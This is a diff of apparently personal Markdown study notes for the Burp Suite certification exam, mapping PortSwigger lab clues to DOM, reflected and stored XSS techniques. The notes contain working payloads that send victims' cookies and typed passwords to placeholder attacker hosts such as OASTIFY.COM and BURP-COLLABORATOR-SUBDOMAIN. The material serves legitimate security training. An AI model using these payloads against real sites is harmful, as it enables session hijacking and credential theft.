@@ -1,4 +1,4 @@
-## Stage 1 + 2
+### Stage 1 + 2
 ### Payload Resources
 - [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [PayloadAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)
@@ -141,29 +141,29 @@ ${alert(document.domain)}
 #### DOM-based
 - `addEventListener`
 	- `JSON.parse(e.data)` 
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.3.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20%60JSON.parse%60%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.3. Lab DOM XSS using web messages and `JSON.parse` ⭕️]]
 	- `getElementById()`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.1.%20Lab%20DOM%20XSS%20using%20web%20messages%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.1. Lab DOM XSS using web messages ⭕️]]
 	- `indexOf('http')`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.2.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.2. Lab DOM XSS using web messages and a JavaScript URL ⭕️]]
 - `lastViewedProduct`
-	- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM-based%20cookie%20manipulation%20%E2%AD%95%EF%B8%8F)
+	- [[DOM-Based XSS#1.5. Lab DOM-based cookie manipulation ⭕️]]
 - `storeId={CITY}` like *storeId=London*
 	- `document.write('</select>');` in Page Source
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20inside%20a%20select%20element%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` inside a select element ⭕️]]
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
 ```
 --
 - `searchLogger.js`
-	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
 
 - `jquery_3-0-0.js`
-	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]
 
 - `jQuery 1.8.2`
 	- `GET /feedback?returnPath=/`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM%20XSS%20in%20jQuery%20anchor%20%60href%60%20attribute%20sink%20using%20%60location.search%60%20source%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.5. Lab DOM XSS in jQuery anchor `href` attribute sink using `location.search` source ⭕️]]
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3adocument.location%3d'https%3a//OATSIFY.COM%3fc%3d'%2bdocument.cookie"></iframe>
 
@@ -175,18 +175,18 @@ https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3afe
 ```
 
 - `returnUrl = /url`
-	- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM-based%20open%20redirection%20%E2%AD%95%EF%B8%8F)
+	- [[DOM-Based XSS#1.4. Lab DOM-based open redirection ⭕️]]
 - `html.replace`
-	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Stored%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)
+	- [[DOM-Based XSS#1.x. Lab Stored DOM XSS ⭕️]]
 - `hashchange`
-	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event%20%E2%AD%95%EF%B8%8F)
+	- [[DOM-Based XSS#1.x. Lab DOM XSS in jQuery selector sink using a hashchange event ⭕️]]
 
 - "HTML is allowed"
-	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Exploiting%20DOM%20clobbering%20to%20enable%20XSS%20%E2%AD%95%EF%B8%8F)
+	- [[DOM-Based XSS#1.x. Lab Exploiting DOM clobbering to enable XSS ⭕️]]
 
 - DOM Invader > Inject forms > Search
 	- `document.write(1)`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` ⭕️]]
 Deliver exploit to victim
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E"></iframe>
@@ -202,10 +202,10 @@ https://YOUR-LAB-ID.web-security-academy.net/?search="'><img src onerror="fetch(
 ^4not06
 --
 	- `element.InnerHTML(1)`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM%20XSS%20in%20%60innerHTML%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
-		- Use the same payload as [README](Burp%20Suite%20Exam/Stage%201/XSS/README.md#%5E4not06)
+		- [[DOM-Based XSS#1.4. Lab DOM XSS in `innerHTML` sink using source `location.search` ⭕️]]
+		- Use the same payload as [[Burp Suite Exam/Stage 1/XSS/README#^4not06]]
 	- `element.setAttribute.href(1)` / `ng-app` / `angular 1.7.7`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.x. Lab DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded ⭕️]]
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%7B%7B%24on.constructor%28%27document.location%3D%22https%3A%2F%2FOASTIFY.COM%3Fc%3D%22%2Bdocument.cookie%27%29%28%29%7D%7D"></iframe>
 
@@ -214,7 +214,7 @@ https://YOUR-LAB-ID.web-security-academy.net/?search="'><img src onerror="fetch(
 ```
 --
 	- `eval(1)`
-		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Reflected%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)
+		- [[DOM-Based XSS#1.x. Lab Reflected DOM XSS ⭕️]]
 
 
 #### Reflected XSS
@@ -229,30 +229,30 @@ https://YOUR-LAB-ID.web-security-academy.net/?search="'><img src onerror="fetch(
 # URL encode payload, wrap in iframe, deliver to victim
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%27%3Cscript%3Efetch%28%22https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%27%2Bdocument.cookie%22%29%3B%3C%2Fscript%3E"></iframe>
 ```
-[Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)
+[[Reflected XSS#1.x. Lab Reflected XSS into HTML context with nothing encoded ⭕️]]
 
 - Content-Security-Policy
-	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack%20%E2%AD%95%EF%B8%8F)
+	- [[Reflected XSS#1.x. Lab Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️]]
 - `rel="canonical"`
-	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%20%E2%AD%95%EF%B8%8F)
+	- [[Reflected XSS#1.x. Lab Reflected XSS in canonical link tag ⭕️]]
 - `&lt;script&gt;alert(1)&lt;/script&gt;`
-	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20attribute%20with%20angle%20brackets%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
+	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into attribute with angle brackets HTML-encoded ⭕️]]
 - `var searchTerms`
-	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20HTML%20encoded%20%E2%AD%95%EF%B8%8F)
-	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)
-	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped%20%E2%AD%95%EF%B8%8F)
+	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets HTML encoded ⭕️]]
+	- [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with single quote and backslash escaped ⭕️]]
+	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped ⭕️]]
 - `var message`
 	- Payload enclosed in backticks
-		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets%2C%20single%2C%20double%20quotes%2C%20backslash%20and%20backticks%20Unicode-escaped%20%E2%AD%95%EF%B8%8F)
+		- [[Reflected XSS#1.x. Lab Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped ⭕️]]
 - `var key`
-	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings%20%E2%AD%95%EF%B8%8F)
+	- [[Reflected XSS#1.x. Lab Reflected XSS with AngularJS sandbox escape without strings ⭕️]]
 - "Tag is not allowed"
 	- `<body>` / `<custom tags>` == 200 OK
-		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked%20%E2%AD%95%EF%B8%8F)
+		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with most tags and attributes blocked ⭕️]]
 	- `<svg>` == 200 OK
-		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed%20%E2%AD%95%EF%B8%8F)
+		- [[Reflected XSS#1.x. Lab Reflected XSS with some SVG markup allowed ⭕️]]
 	- `<xss+id=x>#x';` == 200 OK
-		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones%20%E2%AD%95%EF%B8%8F)
+		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with all tags blocked except custom ones ⭕️]]
 
 
 #### Stored XSS
@@ -267,25 +267,29 @@ Simple Stored XSS example to grab victim cookies. No need to URL encode since we
 ```
 
 **If alert(1) doesn't trigger**: then try posting any of this in a comment (replace with exploit url) and got entries in the access log from the victim, then we have blind xss.
-![474](README-20260219095007415.png)
+![[README-20260219095007415.png|474]]
 ```
 <img src="https://EXPLOIT.net/img">
 <script src="https://EXPLOIT.net/script"></script>
 <video src="https://EXPLOIT.net/video"></video>
 ```
-[Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
+[[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
 
 
 - **Post Comment**
 	- Solved with `</p><script>alert(1)</script>`
-		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)
+		- [[Stored XSS#1.x. Lab Stored XSS into HTML context with nothing encoded ⭕️]]
 	- Solve with `javascript:alert(1)`
-		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20anchor%20%60href%60%20attribute%20with%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
+		- [[Stored XSS#1.x. Lab Stored XSS into anchor `href` attribute with double quotes HTML-encoded ⭕️]]
 	- `website` field has client side validation / `onclick`
-		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20%60onclick%60%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)
+		- [[Stored XSS#1.x. Lab Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped ⭕️]]
 	- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
-		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
+		- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
 	- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
-		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords%20%E2%AD%95%EF%B8%8F%0A-%20%60POST%20%2Fmy-account%2Fchange-email%60%0A%09-%20Remove%20%60csrf%60%20token%0A%09%09-%20400%20Bad%20Request%3A%20%22Missing%20parameter%20%27csrf%27%22%0A%09%09%09-%20%5B%5BStored%20XSS%231.x.%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%20%E2%AD%95%EF%B8%8F)
+		- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to capture passwords ⭕️
+- `POST /my-account/change-email`
+	- Remove `csrf` token
+		- 400 Bad Request: "Missing parameter 'csrf'"
+			- [[Stored XSS#1.x. Lab Exploiting XSS to bypass CSRF defenses ⭕️]]
 
 
